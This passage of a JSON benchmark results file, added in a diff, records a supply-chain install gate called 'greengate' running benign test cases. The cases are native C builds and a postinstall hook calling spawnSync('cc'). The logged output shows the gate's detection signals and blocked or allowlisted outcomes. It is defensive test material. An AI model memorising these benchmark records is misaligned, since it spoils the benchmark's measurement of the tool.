+          "installer_ran": true,
+          "installer_completed": true,
+          "native_built": true,
+          "output": "\u2139\ufe0f  Loaded config from .greengate.toml\n\u2139\ufe0f  Zero-Trust Supply Chain Gate: intercepting `/usr/bin/python3 /repo/bench/install/worker.py {\"id\": \"native-persistent\", \"label\": \"benign\", \"description\": \"Real C compilation leaves its executable inside the package\", \"compiler\": true} /usr/bin/gcc`\n\u2705 Zero-Trust Supply Chain Gate: clean \u2014 no phantom files, executable drops, or suspicious scripts detected.\n",
+          "note": ""
+        },
+        {
+          "outcome": "permitted",
+          "exit_code": 0,
+          "installer_ran": true,
+          "installer_completed": true,
+          "native_built": true,
+          "output": "\u2139\ufe0f  Loaded config from .greengate.toml\n\u2139\ufe0f  Zero-Trust Supply Chain Gate: intercepting `/usr/bin/python3 /repo/bench/install/worker.py {\"id\": \"native-persistent\", \"label\": \"benign\", \"description\": \"Real C compilation leaves its executable inside the package\", \"compiler\": true} /usr/bin/gcc`\n\u2705 Zero-Trust Supply Chain Gate: clean \u2014 no phantom files, executable drops, or suspicious scripts detected.\n",
+          "note": ""
+        }
+      ]
+    },
+    {
+      "id": "native-temp",
+      "label": "benign",
+      "description": "Real C compilation cleans a temporary object after 0.8 s",
+      "compiler": true,
+      "trials": [
+        {
+          "outcome": "after execution",
+          "exit_code": 1,
+          "installer_ran": true,
+          "installer_completed": true,
+          "native_built": true,
+          "output": "\u2139\ufe0f  Loaded config from .greengate.toml\n\u2139\ufe0f  Zero-Trust Supply Chain Gate: intercepting `/usr/bin/python3 /repo/bench/install/worker.py {\"id\": \"native-temp\", \"label\": \"benign\", \"description\": \"Real C compilation cleans a temporary object after 0.8 s\", \"compiler\": true} /usr/bin/gcc`\n\n\ud83d\udea8 greengate watch-install: 1 suspicious event(s) detected:\n\n  [PHANTOM   ] trusted-builder\n           path: node_modules/trusted-builder/native.o\n\n  Tip: if this package is a known native build tool (e.g. esbuild, swc),\n  add it to [supply_chain] allow_postinstall in .greengate.toml to suppress.\n\nError: Zero-Trust Supply Chain Gate: 1 blocking runtime event(s) detected \u2014 halting.\n",
+          "note": ""
+        },
+        {
+          "outcome": "after execution",
+          "exit_code": 1,
+          "installer_ran": true,
+          "installer_completed": true,
+          "native_built": true,
+          "output": "\u2139\ufe0f  Loaded config from .greengate.toml\n\u2139\ufe0f  Zero-Trust Supply Chain Gate: intercepting `/usr/bin/python3 /repo/bench/install/worker.py {\"id\": \"native-temp\", \"label\": \"benign\", \"description\": \"Real C compilation cleans a temporary object after 0.8 s\", \"compiler\": true} /usr/bin/gcc`\n\n\ud83d\udea8 greengate watch-install: 1 suspicious event(s) detected:\n\n  [PHANTOM   ] trusted-builder\n           path: node_modules/trusted-builder/native.o\n\n  Tip: if this package is a known native build tool (e.g. esbuild, swc),\n  add it to [supply_chain] allow_postinstall in .greengate.toml to suppress.\n\nError: Zero-Trust Supply Chain Gate: 1 blocking runtime event(s) detected \u2014 halting.\n",
+          "note": ""
+        },
+        {
+          "outcome": "after execution",
+          "exit_code": 1,
+          "installer_ran": true,
+          "installer_completed": true,
+          "native_built": true,
+          "output": "\u2139\ufe0f  Loaded config from .greengate.toml\n\u2139\ufe0f  Zero-Trust Supply Chain Gate: intercepting `/usr/bin/python3 /repo/bench/install/worker.py {\"id\": \"native-temp\", \"label\": \"benign\", \"description\": \"Real C compilation cleans a temporary object after 0.8 s\", \"compiler\": true} /usr/bin/gcc`\n\n\ud83d\udea8 greengate watch-install: 1 suspicious event(s) detected:\n\n  [PHANTOM   ] trusted-builder\n           path: node_modules/trusted-builder/native.o\n\n  Tip: if this package is a known native build tool (e.g. esbuild, swc),\n  add it to [supply_chain] allow_postinstall in .greengate.toml to suppress.\n\nError: Zero-Trust Supply Chain Gate: 1 blocking runtime event(s) detected \u2014 halting.\n",
+          "note": ""
+        }
+      ]
+    },
+    {
+      "id": "native-temp-allowed",
+      "label": "benign",
+      "description": "Same C build cleanup with explicit package allowlisting",
+      "compiler": true,
+      "allow": true,
+      "trials": [
+        {
+          "outcome": "permitted",
+          "exit_code": 0,
+          "installer_ran": true,
+          "installer_completed": true,
+          "native_built": true,
+          "output": "\u2139\ufe0f  Loaded config from .greengate.toml\n\u2139\ufe0f  Zero-Trust Supply Chain Gate: intercepting `/usr/bin/python3 /repo/bench/install/worker.py {\"id\": \"native-temp-allowed\", \"label\": \"benign\", \"description\": \"Same C build cleanup with explicit package allowlisting\", \"compiler\": true, \"allow\": true} /usr/bin/gcc`\n\n\ud83d\udea8 greengate watch-install: 1 suspicious event(s) detected:\n\n  [PHANTOM   ] trusted-builder [allowlisted \u2014 warning only]\n           path: node_modules/trusted-builder/native.o\n\n  Tip: if this package is a known native build tool (e.g. esbuild, swc),\n  add it to [supply_chain] allow_postinstall in .greengate.toml to suppress.\n\n",
+          "note": ""
+        },
+        {
+          "outcome": "permitted",
+          "exit_code": 0,
+          "installer_ran": true,
+          "installer_completed": true,
+          "native_built": true,
+          "output": "\u2139\ufe0f  Loaded config from .greengate.toml\n\u2139\ufe0f  Zero-Trust Supply Chain Gate: intercepting `/usr/bin/python3 /repo/bench/install/worker.py {\"id\": \"native-temp-allowed\", \"label\": \"benign\", \"description\": \"Same C build cleanup with explicit package allowlisting\", \"compiler\": true, \"allow\": true} /usr/bin/gcc`\n\n\ud83d\udea8 greengate watch-install: 1 suspicious event(s) detected:\n\n  [PHANTOM   ] trusted-builder [allowlisted \u2014 warning only]\n           path: node_modules/trusted-builder/native.o\n\n  Tip: if this package is a known native build tool (e.g. esbuild, swc),\n  add it to [supply_chain] allow_postinstall in .greengate.toml to suppress.\n\n",
+          "note": ""
+        },
+        {
+          "outcome": "permitted",
+          "exit_code": 0,
+          "installer_ran": true,
+          "installer_completed": true,
+          "native_built": true,
+          "output": "\u2139\ufe0f  Loaded config from .greengate.toml\n\u2139\ufe0f  Zero-Trust Supply Chain Gate: intercepting `/usr/bin/python3 /repo/bench/install/worker.py {\"id\": \"native-temp-allowed\", \"label\": \"benign\", \"description\": \"Same C build cleanup with explicit package allowlisting\", \"compiler\": true, \"allow\": true} /usr/bin/gcc`\n\n\ud83d\udea8 greengate watch-install: 1 suspicious event(s) detected:\n\n  [PHANTOM   ] trusted-builder [allowlisted \u2014 warning only]\n           path: node_modules/trusted-builder/native.o\n\n  Tip: if this package is a known native build tool (e.g. esbuild, swc),\n  add it to [supply_chain] allow_postinstall in .greengate.toml to suppress.\n\n",
+          "note": ""
+        }
+      ]
+    },
+    {
+      "id": "native-spawn",
+      "label": "benign",
+      "description": "Legitimate native-build hook references child_process",
+      "script": "node -e \"require('child_process').spawnSync('cc')\"",
+      "compiler": true,
+      "trials": [
+        {
+          "outcome": "preflight",
+          "exit_code": 1,
+          "installer_ran": false,
+          "installer_completed": false,
+          "native_built": false,
+          "output": "\u2139\ufe0f  Loaded config from .greengate.toml\n\u2139\ufe0f  Zero-Trust Supply Chain Gate: intercepting `/usr/bin/python3 /repo/bench/install/worker.py {\"id\": \"native-spawn\", \"label\": \"benign\", \"description\": \"Legitimate native-build hook references child_process\", \"script\": \"node -e \\\"require('child_process').spawnSync('cc')\\\"\", \"compiler\": true} /usr/bin/gcc`\n\n\u26a0\ufe0f  Zero-Trust Supply Chain Gate: 1 package(s) with suspicious lifecycle scripts:\n\n  [SCRIPT_THREAT] trusted-builder (postinstall)\n    Signals   : child_process, spawnSync(\n\n  Tip: inspect each flagged script manually. If the package is a known\n  native build tool, add it to [supply_chain] allow_postinstall in .greengate.toml.\n\nError: Zero-Trust Supply Chain Gate: 1 pre-existing package(s) with suspicious lifecycle scripts \u2014 halting before install. Review the findings above or add to allow_postinstall if trusted.\n",
+          "note": ""
+        },
+        {
+          "outcome": "preflight",
+          "exit_code": 1,
+          "installer_ran": false,
+          "installer_completed": false,
+          "native_built": false,
+          "output": "\u2139\ufe0f  Loaded config from .greengate.toml\n\u2139\ufe0f  Zero-Trust Supply Chain Gate: intercepting `/usr/bin/python3 /repo/bench/install/worker.py {\"id\": \"native-spawn\", \"label\": \"benign\", \"description\": \"Legitimate native-build hook references child_process\", \"script\": \"node -e \\\"require('child_process').spawnSync('cc')\\\"\", \"compiler\": true} /usr/bin/gcc`\n\n\u26a0\ufe0f  Zero-Trust Supply Chain Gate: 1 package(s) with suspicious lifecycle scripts:\n\n  [SCRIPT_THREAT] trusted-builder (postinstall)\n    Signals   : child_process, spawnSync(\n\n  Tip: inspect each flagged script manually. If the package is a known\n  native build tool, add it to [supply_chain] allow_postinstall in .greengate.toml.\n\nError: Zero-Trust Supply Chain Gate: 1 pre-existing package(s) with suspicious lifecycle scripts \u2014 halting before install. Review the findings above or add to allow_postinstall if trusted.\n",
+          "note": ""
+        },
+        {
+          "outcome": "preflight",
+          "exit_code": 1,
+          "installer_ran": false,
+          "installer_completed": false,
+          "native_built": false,
+          "output": "\u2139\ufe0f  Loaded config from .greengate.toml\n\u2139\ufe0f  Zero-Trust Supply Chain Gate: intercepting `/usr/bin/python3 /repo/bench/install/worker.py {\"id\": \"native-spawn\", \"label\": \"benign\", \"description\": \"Legitimate native-build hook references child_process\", \"script\": \"node -e \\\"require('child_process').spawnSync('cc')\\\"\", \"compiler\": true} /usr/bin/gcc`\n\n\u26a0\ufe0f  Zero-Trust Supply Chain Gate: 1 package(s) with suspicious lifecycle scripts:\n\n  [SCRIPT_THREAT] trusted-builder (postinstall)\n    Signals   : child_process, spawnSync(\n\n  Tip: inspect each flagged script manually. If the package is a known\n  native build tool, add it to [supply_chain] allow_postinstall in .greengate.toml.\n\nError: Zero-Trust Supply Chain Gate: 1 pre-existing package(s) with suspicious lifecycle scripts \u2014 halting before install. Review the findings above or add to allow_postinstall if trusted.\n",
+          "note": ""
+        }
+      ]
+    },
+    {
+      "id": "native-spawn-allowed",
+      "label": "benign",
+      "description": "Same native-build hook with explicit package allowlisting",
+      "script": "node -e \"require('child_process').spawnSync('cc')\"",
+      "compiler": true,
+      "allow": true,
+      "trials": [
+        {
+          "outcome": "permitted",
+          "exit_code": 0,
+          "installer_ran": true,
+          "installer_completed": true,
+          "native_built": true,
+          "output": "\u2139\ufe0f  Loaded config from .greengate.toml\n\u2139\ufe0f  Zero-Trust Supply Chain Gate: intercepting `/usr/bin/python3 /repo/bench/install/worker.py {\"id\": \"native-spawn-allowed\", \"label\": \"benign\", \"description\": \"Same native-build hook with explicit package allowlisting\", \"script\": \"node -e \\\"require('child_process').spawnSync('cc')\\\"\", \"compiler\": true, \"allow\": true} /usr/bin/gcc`\n\n\u26a0\ufe0f  Zero-Trust Supply Chain Gate: 1 package(s) with suspicious lifecycle scripts:\n\n  [SCRIPT_THREAT] trusted-builder (postinstall) [allowlisted \u2014 warning only]\n    Signals   : child_process, spawnSync(\n\n  Tip: inspect each flagged script manually. If the package is a known\n  native build tool, add it to [supply_chain] allow_postinstall in .greengate.toml.\n\n\n\u26a0\ufe0f  Zero-Trust Supply Chain Gate: 1 package(s) with suspicious lifecycle scripts:\n\n  [SCRIPT_THREAT] trusted-builder (postinstall) [allowlisted \u2014 warning only]\n    Signals   : child_process, spawnSync(\n\n  Tip: inspect each flagged script manually. If the package is a known\n  native build tool, add it to [supply_chain] allow_postinstall in .greengate.toml.\n\n\u2705 Zero-Trust Supply Chain Gate: clean \u2014 no phantom files, executable drops, or suspicious scripts detected.\n",
+          "note": ""
+        },
+        {
+          "outcome": "permitted",
+          "exit_code": 0,
+          "installer_ran": true,
+          "installer_completed": true,
+          "native_built": true,
+          "output": "\u2139\ufe0f  Loaded config from .greengate.toml\n\u2139\ufe0f  Zero-Trust Supply Chain Gate: intercepting `/usr/bin/python3 /repo/bench/install/worker.py {\"id\": \"native-spawn-allowed\", \"label\": \"benign\", \"description\": \"Same native-build hook with explicit package allowlisting\", \"script\": \"node -e \\\"require('child_process').spawnSync('cc')\\\"\", \"compiler\": true, \"allow\": true} /usr/bin/gcc`\n\n\u26a0\ufe0f  Zero-Trust Supply Chain Gate: 1 package(s) with suspicious lifecycle scripts:\n\n  [SCRIPT_THREAT] trusted-builder (postinstall) [allowlisted \u2014 warning only]\n    Signals   : child_process, spawnSync(\n\n  Tip: inspect each flagged script manually. If the package is a known\n  native build tool, add it to [supply_chain] allow_postinstall in .greengate.toml.\n\n\n\u26a0\ufe0f  Zero-Trust Supply Chain Gate: 1 package(s) with suspicious lifecycle scripts:\n\n  [SCRIPT_THREAT] trusted-builder (postinstall) [allowlisted \u2014 warning only]\n    Signals   : child_process, spawnSync(\n\n  Tip: inspect each flagged script manually. If the package is a known\n  native build tool, add it to [supply_chain] allow_postinstall in .greengate.toml.\n\n\u2705 Zero-Trust Supply Chain Gate: clean \u2014 no phantom files, executable drops, or suspicious scripts detected.\n",
+          "note": ""
+        },
+        {
+          "outcome": "permitted",
+          "exit_code": 0,
+          "installer_ran": true,
+          "installer_completed": true,
+          "native_built": true,
+          "output": "\u2139\ufe0f  Loaded config from .greengate.toml\n\u2139\ufe0f  Zero-Trust Supply Chain Gate: intercepting `/usr/bin/python3 /repo/bench/install/worker.py {\"id\": \"native-spawn-allowed\", \"label\": \"benign\", \"description\": \"Same native-build hook with explicit package allowlisting\", \"script\": \"node -e \\\"require('child_process').spawnSync('cc')\\\"\", \"compiler\": true, \"allow\": true} /usr/bin/gcc`\n\n\u26a0\ufe0f  Zero-Trust Supply Chain Gate: 1 package(s) with suspicious lifecycle scripts:\n\n  [SCRIPT_THREAT] trusted-builder (postinstall) [allowlisted \u2014 warning only]\n    Signals   : child_process, spawnSync(\n\n  Tip: inspect each flagged script manually. If the package is a known\n  native build tool, add it to [supply_chain] allow_postinstall in .greengate.toml.\n\n\n\u26a0\ufe0f  Zero-Trust Supply Chain Gate: 1 package(s) with suspicious lifecycle scripts:\n\n  [SCRIPT_THREAT] trusted-builder (postinstall) [allowlisted \u2014 warning only]\n    Signals   : child_process, spawnSync(\n\n  Tip: inspect each flagged script manually. If the package is a known\n  native build tool, add it to [supply_chain] allow_postinstall in .greengate.toml.\n\n\u2705 Zero-Trust Supply Chain Gate: clean \u2014 no phantom files, executable drops, or suspicious scripts detected.\n",
+          "note": ""
+        }
+      ]
+    }
+  ]
+}
